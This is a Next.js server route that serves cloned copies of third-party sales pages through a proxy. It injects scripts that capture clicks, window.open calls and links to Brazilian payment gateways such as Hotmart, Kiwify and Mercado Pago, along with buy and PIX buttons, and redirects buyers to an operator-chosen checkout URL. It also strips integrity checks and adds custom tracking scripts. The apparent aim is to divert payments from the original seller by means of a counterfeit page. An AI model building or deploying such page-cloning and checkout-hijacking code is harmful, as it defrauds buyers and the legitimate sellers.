import { NextRequest, NextResponse } from 'next/server';
import { supabaseAdmin } from '@/lib/supabase';
import * as cheerio from 'cheerio';

/**
 * Page Proxy God Mode v7.0 — Original Stable
 */

export async function GET(
  req: NextRequest,
  { params }: { params: Promise<{ id: string }> }
) {
  try {
    const { id } = await params;

    // 1. Buscar página com fallback inteligente
    let { data: page, error } = await supabaseAdmin
      .from('cloned_pages')
      .select('*')
      .eq('id', id)
      .single();

    // Se não achar pelo ID (ex: /p/resultado), pega o último clone para manter a navegação ativa
    if (error || !page) {
      const { data: fallback } = await supabaseAdmin
        .from('cloned_pages')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(1)
        .single();
      page = fallback;
    }

    if (!page || !page.original_url) {
      return new NextResponse('<h1>Página não encontrada</h1>', { status: 404 });
    }

    const config = page.config || {};
    const originalUrl = page.original_url;
    const checkoutUrl = config.checkout_url || '';

    const response = await fetch(originalUrl, {
      headers: {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36',
      },
    });

    if (!response.ok) {
      return new NextResponse(`<h1>Erro site original (${response.status})</h1>`, { status: 502 });
    }

    const buffer = await response.arrayBuffer();
    const rawHtml = new TextDecoder('utf-8').decode(buffer);
    const $ = cheerio.load(rawHtml);
    const baseUrl = new URL(originalUrl).origin;
    const targetHost = new URL(originalUrl).host;
    const currentOrigin = req.nextUrl.origin;

    // Detectar SPA (React/Vue/Vite/Next): corpo quase vazio + elemento raiz, ou presença de assets do Next.js
    const bodyText = $('body').text().trim();
    const hasSpaRoot = $('[id="root"],[id="app"],[id="__next"],[data-reactroot]').length > 0;
    const hasNextJs = $('script[src*="_next/static"], link[href*="_next/static"]').length > 0;
    const isSpa = (bodyText.length < 300 && hasSpaRoot) || hasNextJs;

    // 1. BASE TAG (Resolve assets nativamente sem quebrar hidratação do React)
    $('base').remove();
    $('head').prepend(`<base href="${originalUrl}">`);

    // 1b. SPA ENGINE — intercepta fetch/XHR, resolve CORS e lida com hidratação do Next.js
    if (isSpa) {
      const proxyBase = `${currentOrigin}/api/proxy?overrideHost=${targetHost}&url=`;
      const spaEngine = `<script>
(function(){
  var B='${baseUrl}',H='${targetHost}';
  window.__PROXY_HOST__=H;window.__PROXY_ORIGIN__='https://'+H;
  var P='${proxyBase}';

  // TRUQUE DE HIDRATAÇÃO PARA SPAs (Next.js, React, etc.)
  const origReplaceState = window.history.replaceState;
  const originalUrlObj = new URL('${originalUrl}');
  const currentPath = window.location.pathname;
  const currentSearch = window.location.search;
  
  if (currentPath !== originalUrlObj.pathname) {
     origReplaceState.call(window.history, null, '', originalUrlObj.pathname + currentSearch);
     const restoreUrl = () => origReplaceState.call(window.history, null, '', currentPath + currentSearch);
     window.addEventListener('load', () => setTimeout(restoreUrl, 1500));
     setTimeout(restoreUrl, 4000);
  }
  
  // Interceptar FETCH para capturar Server Components (RSC) e APIs
  var _f=window.fetch.bind(window);
  window.fetch=function(input,init){
    var urlStr = '';
    var isRequest = false;
    
    if (typeof input === 'string') urlStr = input;
    else if (input instanceof URL) urlStr = input.toString();
    else if (input instanceof Request) { urlStr = input.url; isRequest = true; }
    
    if (urlStr) {
       var proxiedUrl = '';
       if (urlStr.startsWith('/') && !urlStr.startsWith('//')) {
          proxiedUrl = P + encodeURIComponent(B + urlStr);
       } else if (urlStr.startsWith(B)) {
          proxiedUrl = P + encodeURIComponent(urlStr);
       } else if (urlStr.startsWith(window.location.origin)) {
          try {
             var u = new URL(urlStr);
             proxiedUrl = P + encodeURIComponent(B + u.pathname + u.search);
          } catch(e){}
       }
       
       if (proxiedUrl) {
          if (isRequest) input = new Request(proxiedUrl, input);
          else input = proxiedUrl;
       }
    }
    return _f(input,init);
  };

  // Interceptar XHR
  var _o=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(){
    var a=Array.prototype.slice.call(arguments);
    var urlStr=a[1];
    if (urlStr) {
       if (typeof urlStr === 'string' || urlStr instanceof URL) {
           var str = urlStr.toString();
           if(str.startsWith('/')&&!str.startsWith('//')){ a[1] = P+encodeURIComponent(B+str); }
           else if(str.startsWith(B)){ a[1] = P+encodeURIComponent(str); }
           else if(str.startsWith(window.location.origin)) {
               try {
                  var u = new URL(str);
                  a[1] = P+encodeURIComponent(B + u.pathname + u.search);
               } catch(e){}
           }
       }
    }
    return _o.apply(this,a);
  };

  // INTERCEPTAR SCRIPTS/LINKS DINÂMICOS DO WEBPACK/NEXT.JS
  var origCreateElement = document.createElement;
  document.createElement = function(tagName) {
     var el = origCreateElement.call(document, tagName);
     var lowerTag = tagName.toLowerCase();
     if (lowerTag === 'script' || lowerTag === 'link') {
        var origSetAttribute = el.setAttribute;
        el.setAttribute = function(name, value) {
           if ((name === 'src' || name === 'href') && value) {
              if (value.startsWith('/')) value = P + encodeURIComponent(B + value);
              else if (value.startsWith(B)) value = P + encodeURIComponent(value);
              else if (value.startsWith(window.location.origin)) {
                 try {
                    var u = new URL(value);
                    value = P + encodeURIComponent(B + u.pathname + u.search);
                 } catch(e){}
              }
           }
           return origSetAttribute.call(this, name, value);
        };
        var prop = lowerTag === 'link' ? 'href' : 'src';
        Object.defineProperty(el, prop, {
           set: function(val) {
              if (val && typeof val === 'string') {
                 if (val.startsWith('/')) val = P + encodeURIComponent(B + val);
                 else if (val.startsWith(B)) val = P + encodeURIComponent(val);
                 else if (val.startsWith(window.location.origin)) {
                     try {
                        var u = new URL(val);
                        val = P + encodeURIComponent(B + u.pathname + u.search);
                     } catch(e){}
                 }
              }
              origSetAttribute.call(this, prop, val);
           },
           get: function() { return this.getAttribute(prop); }
        });
     }
     return el;
  };
})();
</script>`;
      $('head').prepend(spaEngine);
    }

    // 2. Script de interceptação de Checkout (Nível Window Capture + MutationObserver)
    const engineScript = `
      <script>
        (function() {
          var CHECKOUT_URL = ${JSON.stringify(checkoutUrl)};
          if (!CHECKOUT_URL) return;

          var GATEWAYS = [
            'pay.hotmart', 'pay.kiwify', 'pay.', 'hotmart.com', 'checkout', 'cakto',
            'kiwify', 'hotmart', 'eduzz', 'monetizze', 'braip', 'perfectpay', 'ticto',
            'yampi', 'cartpanda', 'greenn', 'pepper', 'lowify', 'ironpay', 'lastlink',
            'kirvano', 'pagarme', 'mercadopago'
          ];

          function isGatewayUrl(url) {
            if (!url || typeof url !== 'string') return false;
            var lower = url.toLowerCase();
            return GATEWAYS.some(function(g) { return lower.includes(g); });
          }

          function forceCheckout(e) {
            if (e && e.preventDefault) e.preventDefault();
            if (e && e.stopPropagation) e.stopPropagation();
            if (e && e.stopImmediatePropagation) e.stopImmediatePropagation();
            // Evita redirecionamento se for o mesmo link
            if (window.location.href !== CHECKOUT_URL) {
              window.location.href = CHECKOUT_URL;
            }
            return false;
          }

          // ─── 1. INTERCEPTAÇÃO DE CLIQUES GLOBAIS (Capture Phase) ──────────────
          // Isso roda ANTES do React ou qualquer framework processar o clique
          window.addEventListener('click', function(e) {
            var el = e.target;
            var depth = 0;
            while (el && el !== document.body && depth < 8) {
              var tag = el.tagName;
              var href = el.getAttribute ? (el.getAttribute('href') || '') : '';
              var text = (el.textContent || '').trim().toUpperCase();
              
              // Verifica se é um botão de checkout pelo texto (muito comum em SPAs onde o botão não tem href)
              var isCheckoutText = 
                text.includes('OBTER MEU PLANO') || 
                text.includes('COMPRAR AGORA') || 
                text === 'COMPRAR' ||
                text.includes('PAGAR COM CART') || 
                text.includes('PAGAR COM PIX');

              // Verifica se o href é de um gateway
              var isGatewayHref = href && isGatewayUrl(href);
              
              // Não intercepta botões de "INICIAR" ou "QUIZ"
              if (text.includes('INICIAR') || text.includes('QUIZ')) {
                 el = el.parentElement;
                 depth++;
                 continue;
              }

              if (isCheckoutText || isGatewayHref || el.id === '39Kr7c') {
                return forceCheckout(e);
              }

              el = el.parentElement;
              depth++;
            }
          }, { capture: true });

          // ─── 2. INTERCEPTA window.open ─────────────────────────────────────────
          var _origOpen = window.open;
          window.open = function(url, target, features) {
            if (url && isGatewayUrl(url.toString())) {
              window.location.href = CHECKOUT_URL;
              return null;
            }
            return _origOpen.call(this, url, target, features);
          };

          // ─── 3. PATCHER DE DOM ESTÁTICO E MUTATION OBSERVER ──────────────────
          // Substitui atributos no HTML diretamente (ótimo para sites WordPress/clássicos)
          function patchDom() {
            // 1. Tag A com href de gateway
            document.querySelectorAll('a[href]').forEach(function(el) {
              var h = el.getAttribute('href') || '';
              if (h && h !== CHECKOUT_URL && isGatewayUrl(h)) {
                el.setAttribute('href', CHECKOUT_URL);
                el.setAttribute('target', '_self');
                el.removeAttribute('rel');
                el.dataset.patched = 'true';
              }
            });

            // 2. Botões clássicos que precisam virar link
            document.querySelectorAll('button').forEach(function(btn) {
              var text = (btn.textContent || '').trim().toUpperCase();
              if (text.includes('OBTER MEU PLANO') || text.includes('COMPRAR AGORA') || btn.id === '39Kr7c') {
                if (!btn.dataset.patched) {
                  var link = document.createElement('a');
                  link.href = CHECKOUT_URL;
                  link.innerHTML = btn.innerHTML;
                  link.className = btn.className;
                  link.id = btn.id;
                  link.dataset.patched = 'true';
                  link.style.cssText = btn.style.cssText;
                  link.style.textDecoration = 'none';
                  
                  var displayStyle = window.getComputedStyle(btn).display;
                  if (displayStyle === 'inline' || displayStyle === '') {
                     link.style.display = 'inline-block';
                  }
                  
                  link.onclick = forceCheckout;
                  btn.parentNode.replaceChild(link, btn);
                }
              }
            });
          }

          document.addEventListener('DOMContentLoaded', patchDom);
          var obs = new MutationObserver(patchDom);
          var startObs = function() {
            if (document.body) {
              obs.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['href'] });
              patchDom();
            } else { setTimeout(startObs, 100); }
          };
          startObs();
          var runs = 0;
          var fb = setInterval(function() { patchDom(); if (++runs >= 10) clearInterval(fb); }, 2000);

        })();
      </script>
    `;
    $('head').append(engineScript);

    // 3. Proxy de Scripts CSS Nativos para evitar bloqueio CORS
    // Deixamos os assets nativos intactos para não quebrar a hidratação, 
    // mas scripts na tag original (não dinâmicos) podem ser proxied.
    $('[src], [href]').each((_, el) => {
      const tag = $(el).prop('tagName');
      const attr = $(el).attr('src') ? 'src' : 'href';
      let val = $(el).attr(attr) || '';
      if (!val || val.startsWith('data:') || val.startsWith('javascript:') || val.startsWith('#')) return;

      if (tag === 'SCRIPT' || (tag === 'LINK' && $(el).attr('rel') === 'stylesheet')) {
        const abs = val.startsWith('/') ? baseUrl + val : (val.startsWith('http') ? val : baseUrl + '/' + val);
        $(el).attr(attr, `${currentOrigin}/api/proxy?url=${encodeURIComponent(abs)}&overrideHost=${targetHost}`);
        $(el).removeAttr('integrity').removeAttr('crossorigin');
      }
    });

    if (config.pixel_script) $('body').append(config.pixel_script);
    if (config.head_scripts) $('head').append(config.head_scripts);
    if (config.body_scripts) $('body').append(config.body_scripts);

    return new NextResponse($.html(), { headers: { 'Content-Type': 'text/html; charset=utf-8' } });

  } catch (error: any) {
    return new NextResponse(`Erro: ${error.message}`, { status: 500 });
  }
}
